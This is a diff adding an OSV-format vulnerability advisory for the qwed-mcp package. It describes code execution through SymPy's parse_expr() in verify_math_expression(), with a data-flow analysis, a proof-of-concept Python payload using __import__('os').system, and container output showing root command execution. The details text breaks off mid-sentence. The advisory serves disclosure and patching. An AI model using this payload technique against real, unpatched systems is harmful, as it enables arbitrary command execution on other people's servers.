@@ -1,0 +1,67 @@
+{
+  "schema_version": "0.1.0",
+  "id": "AGT-2026-0148",
+  "modified": "2026-09-10T12:26:02.991255731Z",
+  "published": "2026-08-25T15:26:43Z",
+  "aliases": [
+    "GHSA-mw6r-2hvm-4rp2",
+    "CVE-2026-55546",
+    "PYSEC-2026-3915"
+  ],
+  "summary": "qwed-mcp has Unsafe SymPy `parse_expr()` Remote Code Execution via Unsanitized Math Expression Input",
+  "details": "### Summary\n\n`verify_math_expression()` in `qwed-mcp` v0.2.0 passes attacker-controlled strings directly to SymPy's `parse_expr()` without restricting `global_dict` or validating the expression's AST. Because `parse_expr()` internally calls `eval()` and Python automatically injects the current module's `__builtins__` when no explicit restriction is set, an attacker can embed arbitrary Python expressions — including `__import__('os').system(...)` — to execute OS commands in the context of the running process. Confirmed exploitation in a Docker container yields root-level arbitrary command execution with no authentication or special configuration required.\n\n### Details\n\nThe vulnerability resides in `src/qwed_mcp/engines/math_engine.py`. The public function `verify_math_expression(expression, claimed_result, operation)` accepts both the `expression` and `claimed_result` arguments as raw strings and passes them — after a trivial `^` → `**` substitution — to `sympy.parsing.sympy_parser.parse_expr()`:\n\n```python\n# math_engine.py:50-54\nexpr = parse_expr(\n    expression.replace(\"^\", \"**\"),\n    local_dict={\"x\": x, \"y\": y, \"z\": z, \"pi\": pi, \"e\": E},\n    transformations=transformations\n)\n```\n\n```python\n# math_engine.py:64-68\nclaimed = parse_expr(\n    claimed_result.replace(\"^\", \"**\"),\n    local_dict={\"x\": x, \"y\": y, \"z\": z, \"pi\": pi, \"e\": E},\n    transformations=transformations\n)\n```\n\n`local_dict` only adds math symbols to the evaluation namespace; it does **not** remove `__builtins__`. SymPy's `parse_expr()` eventually calls Python's built-in `eval()`, which — absent an explicit `{\"__builtins__\": {}}` in `global_dict` — receives the full built-in namespace. This makes `__import__`, `open`, `exec`, and every other Python built-in available to the evaluated expression.\n\nThere is no allowlist, AST pre-validation, or sandboxing applied at any point before the `parse_expr()` calls (lines 50 and 64).\n\nData flow:\n\n1. **Source** — `math_engine.py:13-16`: external caller supplies `expression` and `claimed_result`.\n2. **Propagation** — `math_engine.py:50-54`: `expression` substituted and forwarded to `parse_expr()`.\n3. **Propagation** — `math_engine.py:64-68`: `claimed_result` substituted and forwarded to `parse_expr()`.\n4. **Sink** — `sympy.parsing.sympy_parser.parse_expr()`: calls `eval()` with unrestricted `__builtins__`.\n\n### PoC\n\n**Environment setup**\n\n```bash\n# Clone the repository at the affected commit\ngit clone https://github.com/QWED-AI/qwed-mcp\ncd qwed-mcp\ngit checkout 54ac682699407310b5a71fbaed8c33f581b84301\n\n# Option A — direct Python\npython3 -m venv /tmp/qwed-mcp-venv\nsource /tmp/qwed-mcp-venv/bin/activate\npip install sympy>=1.12\n\n# Option B — Docker (used for Phase 2 verification)\ndocker build -t vuln001-rce -f vuln-001/Dockerfile reports/pypiAi_1775_QWED-AI__qwed-mcp\ndocker run --rm vuln001-rce\n```\n\n**Exploit input**\n\n```python\nimport importlib.util, sys, os\n\nspec = importlib.util.spec_from_file_location(\n    \"qwed_mcp.engines.math_engine\",\n    \"src/qwed_mcp/engines/math_engine.py\"\n)\nmod = importlib.util.module_from_spec(spec)\nsys.modules[\"qwed_mcp.engines.math_engine\"] = mod\nspec.loader.exec_module(mod)\nverify_math_expression = mod.verify_math_expression\n\npayload = \"__import__('os').system('id > /tmp/vuln001_rce_output.txt && hostname >> /tmp/vuln001_rce_output.txt && touch /tmp/vuln001_rce_marker')\"\nverify_math_expression(payload, \"0\")\n\nprint(\"marker_exists:\", os.path.exists(\"/tmp/vuln001_rce_marker\"))\nwith open(\"/tmp/vuln001_rce_output.txt\") as f:\n    print(f.read())\n```\n\n**Expected output (Phase 2 Docker observation)**\n\n```\n[+] *** EXPLOIT SUCCESSFUL ***\n[+] Marker file present : /tmp/vuln001_rce_marker\n[+] RCE command output  :\n--- BEGIN OUTPUT ---\nuid=0(root) gid=0(root) groups=0(root)\n2d2fe45d37b6\n--- END OUTPUT ---\n\n[RESULT] PASS — deterministic RCE evidence observed inside container\n```\n\nThe marker file `/tmp/vuln001_rce_marker` is created and `id` output confirms execution as root with no patches, flags, or privileged co\n\nImported from OSV GHSA-mw6r-2hvm-4rp2.",
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://osv.dev/vulnerability/GHSA-mw6r-2hvm-4rp2"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/QWED-AI/qwed-mcp/security/advisories/GHSA-mw6r-2hvm-4rp2"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/QWED-AI/qwed-mcp/pull/22"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/QWED-AI/qwed-mcp/commit/362e61892052e250c56cb1ee852024d6f98c467b"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/QWED-AI/qwed-mcp"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/QWED-AI/qwed-mcp/releases/tag/v0.2.1"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "qwed-mcp"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.2.1"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "database_specific": {
+    "artifact_type": "mcp_server",
+    "classification": "vulnerable",
+    "verification": "verified",
+    "reporter": "osv-import",
+    "severity": "critical"
+  }
+}
